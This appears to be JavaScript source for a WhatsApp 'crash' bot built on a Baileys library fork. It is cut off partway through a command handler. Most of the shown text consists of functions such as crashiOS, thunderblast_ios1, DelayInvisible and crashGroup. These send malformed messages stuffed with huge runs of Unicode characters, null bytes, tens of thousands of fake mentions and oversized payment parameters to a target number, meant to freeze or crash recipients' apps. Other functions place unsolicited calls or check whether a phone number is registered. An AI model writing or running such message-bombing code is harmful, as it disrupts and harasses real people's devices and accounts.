import { config } from './config.js';
import pkg from 'baron-baileys-v2';
import FormData from 'form-data';
import fs from 'fs';
import moment from 'moment-timezone';
import pino from 'pino';
import os from 'os';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import axios from 'axios';
import nodeFetch from 'node-fetch';

const { 
  normalizeMessageContent,
  generateMessageIDV2,
  generateMessageID, 
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  useMultiFileAuthState,
  makeWASocket,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore
} = pkg;

// Importar solo las funciones que existen en myfunc.js
import { smsg, fetchJson, getBuffer, getGroupAdmins, isUrl, sleep, clockString, runtime, tanggal, getRandom, checkBandwidth } from './lib/myfunc.js';

import { createRequire } from 'module';
const require = createRequire(import.meta.url);

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const logger = pino({ level: 'debug' });

export default async function(conn, m, chatUpdate, store) {
try {
const from = m.key.remoteJid
const info = m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

// Corregir declaraciones de tiempo
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
const time = hora // Asignar hora a time
const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
const date = data
const dataa = data

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, isUrl, sleep, clockString, runtime, tanggal, getRandom } = require('./lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
// prefijo único
var prefix = "$";
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const text = args.join(" ")
const q = args.join(" ")
const sender = m.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)
const senderNumber = sender.split('@')[0]

const userList = [
"yournumber@s.whatsapp.net",
"friendsnumber@s.whatsapp.net",
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net",
"593969533280@s.whatsapp.net",
"584163679167@s.whatsapp.net"
];
const candList = [
    "5216421147692@s.whatsapp.net", 
    "yournumber@s.whatsapp.net",
    "friendsnumber@s.whatsapp.net",
    "120363421317937545@g.us",
    "13135550002@s.whatsapp.net",
    "593969533280@s.whatsapp.net",
    "584163679167@s.whatsapp.net",
    "5491130524256@s.whatsapp.net"
];
const groupid = [ 
 "120363421317937545@g.us",
 "120363415442586508@g.us",
 "120363421386564277@g.us",
 "120363420474631547@g.us",
 "120363402299771381@g.us",
 ];

const joinedArgs = args.join(' ');
const targetNumber = joinedArgs.replace(/[^\d]/g, '');
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = m.key.fromMe ? true : false
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
const pickRandom = (arr) => {return arr[Math.floor(Math.random() * arr.length)]}
const dispositivo = '' + (m.key.id.length > 21 ? 'Android' : m.key.id.substring(0, 2) == '3A' ? 'IOS' : 'WhatsApp web');
const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'
const enviarVideoButton = async (id, link, captionText, idbutton, displayButton) => {await conn.sendMessage(id, {video: { url: link},caption: captionText,buttons: [{buttonId: idbutton,buttonText: { displayText: displayButton },type: 1,}],headerType: 1,viewOnce: true,})};
const enviariMageButton = async (id, link, captionText, idbutton, displayButton) => {await conn.sendMessage(id, {image: { url: link},caption: captionText,buttons: [{buttonId: idbutton,buttonText: { displayText: displayButton },type: 1,}],headerType: 1,viewOnce: true,})};
const enviarTextButton = async (id, texto, footertexto, idbutton, displayButton) => {await conn.sendMessage(id, {text: texto,footer: footertexto,buttons: [{buttonId: idbutton,buttonText: { displayText: displayButton },type: 1,}],headerType: 1,viewOnce: true,});};
const enviar = (texto) => {conn.sendMessage(from, { text: texto})}
const reply = (texto) => {conn.sendMessage(from, { text: texto})}

const RESET = '\x1b[0m';
const GREEN = '\x1b[32m';
const BLUE = '\x1b[34m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const WHITE = '\x1b[37m';

if (m.message) {
console.log(`
╭─────────────────────────────────
│
│〔 ${RED}PRIVADO${RESET} 〕: ${WHITE}${from}${RESET}
│
│〔 ${RED}DE${RESET} 〕: ${YELLOW}${sender}${RESET}
│〔 ${RED}MENSAGEM${RESET} 〕: ${GREEN}${body.length > 90 ? "" : body}${RESET}
│〔 ${RED}NiCK${RESET} 〕: ${GREEN}${pushname}${RESET}
│〔 ${RED}TYPE${RESET} 〕: ${GREEN}${m.mtype}${RESET}
│〔 ${RED}DiSPOSiTiVO${RESET} 〕: ${GREEN}${dispositivo}${RESET}
╰─────────────────────────────────`) 
}

const bytesToSize = (bytes) => {const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];if (bytes === 0) return '0 Byte';const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10);return `${Math.round(bytes / Math.pow(1024, i), 2)} ${sizes[i]}`;};
const used = process.memoryUsage();
const cpus = os.cpus().map(cpu => {cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);return cpu;});
const cpu = cpus.reduce((last, cpu, _, {length}) => {last.total += cpu.total;last.speed += cpu.speed / length;last.times.user += cpu.times.user;last.times.nice += cpu.times.nice;last.times.sys += cpu.times.sys;last.times.idle += cpu.times.idle;last.times.irq += cpu.times.irq; return last;}, {speed: 0,total: 0,times: {user: 0,nice: 0,sys: 0,idle: 0,irq: 0}});
const timestamp = new Date().getTime();
const latencia = timestamp - new Date().getTime();
const neww = Date.now();
const oldd = Date.now();
function timefunction(seconds) {seconds = Number(seconds);var d = Math.floor(seconds / (3600 * 24));var h = Math.floor(seconds % (3600 * 24) / 3600);var m = Math.floor(seconds % 3600 / 60);var s = Math.floor(seconds % 60);var dDisplay = d > 0 ? d + (d == 1 ? " Dia, " : " Dias, ") : "00 dias, ";var hDisplay = h > 0 ? h + (h == 1 ? " Hora, " : " Horas, ") : "00 horas, ";var mDisplay = m > 0 ? m + (m == 1 ? " Minuto, " : " Minutos, ") : "00 minutos, ";var sDisplay = s > 0 ? s + (s == 1 ? " Segundo" : " Segundos") : "00 segundos";return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;}
const uptimeSeconds = Math.floor(process.uptime());
const uptimeFormatted = timefunction(uptimeSeconds);
const iphost = await fetchJson(`https://api.ipify.org/?format=json`)
const web = fs.readFileSync('./src/opa.webp');
const chatId = m.chat;
const uwu = 'ꦿꦶꦷꦸꦹꦽ'.repeat(500);
const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(600);
const axios = require('axios');
const delay = ms => new Promise(res => setTimeout(res, ms));
const crypto = require('crypto');
messageSecret: crypto.randomBytes(32)

//++++++++Funcion 1++++++++++\\
async function LocaBugs(target) {
 await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `☠️ • 𝐂𝐫𝐚𝐬𝐡 𝐔𝐢? 𝐤𝐤𝐤𝐤𝐣𝐜`+'ꦿꦶꦷꦸꦹꦽ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "✨️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}
//++++++++++++Funcion 2+++++++++++++\\
async function ZeroRadiactive(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "✨️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛" + "ោ៝".repeat(10000),
        title: "✨️ • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
    fileLength: "5945180",
    seconds: 17,
    mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
    height: 1280,
    width: 720,
    fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
    directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "✨️ • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡"
        },
        streamingSidecar: "Rtr68xZ6G4TzcRHjr2QpMxn4BDOY3u/wOhpZ7qJj+Cg8o5+aXkCfIr2XfjcFmaQk/CgQLAOyAU6D5mHVhXkKxHpzrhZ2koMZVQLsRHAd5KwxayVXt+6eSl8ZnzpxdFhQ+HTByMt4tpTA39l6zU/jpCdDR/qzd/0Rs3qqwCuswd5ZiUf1c0CB9GwQUmc+yFFux6mspHm/gUe+TkftR2ZiKtf3Y5j9RmHHt9IuFX1KVj9jNj20ZfOJptjEYhgDwfDBIdr3/ddRQNaAlRyp2wTh8XEKUynBSbONgnjPIkj8JEl0OsFJqMeTwQyub9HsM/vRa6o8av0NHBn37ZO8Nag05Dpdvon0swsdnXDtomN6q4x+ls2RfnSeEAvRFGsgiG8H8naybUUY0uhYDpPBYHvuH/9fRwDOD9SPITongjimPplk0GOOmfeAamC9EbhDs/c8/5XL40AUbvshQDLIG3l0oTV4ta6zy/VdAclglFmhfVqeedilMk+lG29lpfIbag1nFu+qPZLIieXYQJ418DtASPmFtbsNYkvprPx7xF9ZtyoIa6gZ+v/4qCigvshtRf5n9msopfNJjyPLIrMAoq1475aB4j3puzXwkNm5NSVIahkuX1HWPnApe5lgOzymvJj3N/n0JCg/+PIYv4Jm6z0ZInZRxt3hrvXObchfVIkVuSKqd5U8WIjoOf+FI+CrvdaZBnb+2KH8A1GkskhNTL3DO+Sv1qYRlBFsk21So8abrZlqspnfVMF7DSoJen6s8GowXbrrJZPvwDnhhzL4IKjY0mrUzxnwTeCycU6OstR/ZKMkbg7OUA3+g+pM1k6eLdN53mkMKCt13WwvXndvmW/ekTMqOYc/rjoFQovbTPhcAMTX/kLegR3meuhxBvNE8xXyYvrI6lIIeGpNNsV32O03Li99BwF7hG7OxydsX0/OsYqJnPAUqvUdb1L9dTafihVeZPdokMN4VjqohFhgZiPsaNQScWDL/kAokANUdQ5QgEy6cn5/stxZMb0H7+grn3jHyBX7TfCnA7xjnyLJ4EEn1GN1NwapIyCP2+wwO4ewVHtkcEN88tzj5XIpYTASomq3ITa0iuZiparFg4Th3OGGKNCF4dwOnwARxsAhQisJUFr7mZq6qS6rTAvXWBkIDjr/3+FSvbG5RJJzMl9a1NN9tj4+epOQqkSKzjWbhv0f6fI1FTlJOpKkfsE5HIdWDg==",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await conn.relayMessage("status@broadcast", msg1.message, {
        messageId: msg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await conn.relayMessage("status@broadcast", msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    if (isCreator) {
        await conn.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }}, { participant: { jid: target } });
    }
}

//++++++++++++Funcion 3+++++++++++++\\
async function thunderblast_ios1(target) {
    const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🎗","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await conn.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("UNDEFINEDONTOP", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await conn.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: TravaIphone,
            url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
    }, { participant: { jid: target } });

await conn.relayMessage(target, {
        'extendedTextMessage': {
            'text': TravaIphone,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': '🍏 • 𝐍𝐨 𝐭𝐫𝐚𝐯𝐚 𝐢𝐏𝐡𝐨𝐧𝐞 𝟏𝟓? 𝐤𝐤𝐤𝐤𝐣𝐜' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "SAMSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await conn.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "🍏 𝐏.𝐀. 𝐙𝐢𝐧 𝐢𝐎𝐒" + TravaIphone,
            url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
    }, { participant: { jid: target } });
    
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "🍏 • 𝐊𝐚𝐭𝐡 𝐂𝐫𝐚𝐬𝐡" + TravaIphone,
            url: "https://youtube.com/@p.a.zinwebkkkkj"
        }
    }, { participant: { jid: target } });
}
//++++++++++++Funcion 4+++++++++++++\\
async function sendOfferVideoCall(isTarget, ptcp = true) {
  try {
    await conn.offerCall(isTarget, { 
      video: true 
    });
    console.log(`Exitoso ✅️`);
  } catch (error) {
    console.error(`error en:`, error);
  }
}
//++++++++++++Funcion 5+++++++++++++\\
async function sendOfferCall(isTarget, ptcp = true) {

    try {

        await conn.offerCall(isTarget);

        console.log(`Exitoso ✅️`);

    } catch (error) {

        console.error(`error`, error);

    }

}
const cataui = fs.readFileSync("./src/cataui.js", "utf8");


async function crashiOS(target) {
 await conn.sendMessage(target, {
 text:
 "BOOT FREE" +
 "𑇂𑆵𑆴𑆿".repeat(60000),
 contextInfo: {
 externalAdReply: {
 title: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>`,
 body: `BOOT FREE`,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync("./media/ola.jpg"),
 sourceUrl: ``
 }
 }
 }, { quoted: m });
}

const choco = {
  key: {
    fromMe: false,
    remoteJid: "status@broadcast",
    participant: "0@s.whatsapp.net"
  },
  message: {
    contactMessage: {
      displayName: "⿻𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦⿻",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:ZETAS COLLAB\nTEL;type=CELL;type=VOICE;waid=593969533280:593969533280\nEND:VCARD`
    }
  }
}
async function mikirKidz(conn, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await conn.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG ✅✅");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
async function crashGroup(target) {
let msg = generateWAMessageFromContent(target, {
  interactiveMessage: {
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 1972,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    }, 
    header: {
      jpegThumbnail: `7eppImg`, 
      hasMediaAttachment: true, 
      title: "D | 7eppeli-Exploration"
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "review_and_pay",
          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
    }, 
  }
}, { userJid:target });
  
  await conn.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}
async function DelayInvisible(conn, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Nted Suka Besi 😹" + "ꦾ".repeat(45000),
                address: "MedanWok 😹",
              },
            },
            body: {
              text: "Nted Pen Nenen Jir" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "Nted-Doc.txt",
                  mimetype: "text/plain",
                  fileLength: 999999999,
                  caption: "Nted Crasher Neverdie?",
                  pageCount: 9999,
                  mediaKey: "\u0000".repeat(50),
                  jpegThumbnail: Buffer.from(""),
                },
              },
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function SqlCaraosel(conn, jid) {
  const msg = {
    viewOnceMessage: {
      message: {
        carouselMessage: {
          cards: [
            {
              header: {
                title: "Sql Caraosel¿",
                subtitle: "#PorExport",
                hasMediaAttachment: true,
              },
              body: { text: "Sql Caraosel¿" },
            },
          ],
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                status: true,
                buttonParamsJson: "{}",
              }),
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "[".repeat(7000),
          version: 3,
        },
      },
    },
  };

  await conn.relayMessage(jid, msg, {
    messageId: generateMessageID(),   // ✅ cambio aquí
    participant: { jid },
    messageTimestamp: Date.now(),
  });
}
async function handleStatusBox(sock, msg) {
  const text =
    msg.message?.conversation ||
    msg.message?.extendedTextMessage?.text ||
    msg.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
    "";

  // separar comando y número
  const args = text.trim().split(/\s+/);
  const number = args[1]; // lo que viene después de "statusbox"

  if (!number) {
    await sock.sendMessage(msg.key.remoteJid, { text: "❌ Error: Debes ingresar un número." }, { quoted: msg });
    return;
  }

  try {
    // verificar en WhatsApp
    const [result] = await sock.onWhatsApp(number);

    if (!result) {
      await sock.sendMessage(msg.key.remoteJid, { text: `❌ El número ${number} no está en WhatsApp.` }, { quoted: msg });
      return;
    }

    const data = {
      Number: number,
      Status: result.exists ? "activo" : "no existe",
      Jid: result.jid
    };

    await sock.sendMessage(msg.key.remoteJid, { text: JSON.stringify(data, null, 2) }, { quoted: msg });

  } catch (e) {
    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Error: ${e.message}` }, { quoted: msg });
  }
}
switch(command) {
case "statusbox": {
  try {
    await handleStatusBox(conn, m); 
  } catch (e) {
    console.error(e);
    await conn.sendMessage(m.chat, { text: `❌ Error: ${e.message}` }, { quoted: m });
  }
  break;
}
case 'button':
if (!isBot && !isCreator) return
if (m.isGroup && groupid.includes(m.chat)) {
    return reply("❎❎❎❎");
}
await conn.sendMessage(from, {
image: { url: './src/foto.jpg' },
"contextInfo": {
  "externalAdReply": {
    "title": `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
    "body": 'ola',
    "mediaType": 4,
    "thumbnail": web,
"jpegThumbnail": web,
    "MediaUrl": 'https://youtube.com/@p.a.zinwebkkkkj',
    "sourceUrl": 'https://whatsapp.com/channel/0029VaorTv7AzNbwdT52Rj2C'
  }
},
caption: `☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️`,
